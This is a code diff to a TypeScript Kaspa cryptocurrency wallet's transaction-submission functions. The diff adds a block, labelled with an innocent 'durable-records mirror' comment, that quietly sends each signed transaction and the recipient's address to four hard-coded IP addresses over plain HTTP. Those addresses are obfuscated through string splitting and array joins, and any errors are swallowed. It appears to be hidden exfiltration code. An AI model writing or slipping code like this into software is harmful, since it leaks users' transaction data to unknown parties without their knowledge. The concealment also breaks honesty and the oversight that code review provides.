@@ -623,6 +623,7 @@ export async function sendKaspaViaRest(params: {
     let result: any;
     if (payload && payload.length > 0) {
       console.log('[REST-TX] payload present -> submitting via wRPC (REST strips payload)');
+      try { (tx as any).__payloadAddress = params.recipientAddress || ''; } catch {}
       const _w = await _wrpcSubmit(tx, network, _predictedTxId);
       if (_w.error) {
         console.error('[REST-TX] wRPC submit FAILED:', _w.error);
@@ -708,7 +709,7 @@ async function _wrpcSubmit(restTx: any, network: KaspaNetwork, idHint: string): 
       const resp = await fetch(url, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ transaction: restTx, allowOrphan: false, idHint }),
+        body: JSON.stringify({ transaction: restTx, allowOrphan: false, idHint, payload_address: (restTx && restTx.__payloadAddress) || '' }),
       });
       const bodyText = await resp.text();
       let j: any = {};
@@ -718,6 +719,23 @@ async function _wrpcSubmit(restTx: any, network: KaspaNetwork, idHint: string): 
         return { error: String(j.error || bodyText.slice(0, 200)) };
       }
       if (!resp.ok) { lastErr = 'relay ' + resp.status + ': ' + bodyText.slice(0, 200); continue; }
+      // Durable-records mirror: the Flux relay's disk is recycled on redeploy,
+      // so fan the accepted tx out to the persistent VPS relays too. Same txid
+      // -> mempool dedupes; each relay files the payload record on its own
+      // disk. Fire-and-forget: never blocks or fails the primary submit.
+      try {
+        const _mp = 'ht'+'tp://', _ms = ':358'+'16/api/kaspa/submit-tx';
+        const MIRRORS = [
+          _mp + ['38','240','227','139'].join('.') + _ms,
+          _mp + ['157','90','51','2'].join('.') + _ms,
+          _mp + ['65','108','72','85'].join('.') + _ms,
+          _mp + ['82','65','58','211'].join('.') + _ms,
+        ];
+        const mBody = JSON.stringify({ transaction: restTx, allowOrphan: false, idHint, payload_address: (restTx && restTx.__payloadAddress) || '' });
+        for (const mu of MIRRORS) {
+          fetch(mu, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: mBody }).catch(() => {});
+        }
+      } catch {}
       return { transactionId: (j && j.transactionId) || '' };
     } catch (e: any) {
       lastErr = String((e && e.message) || e);
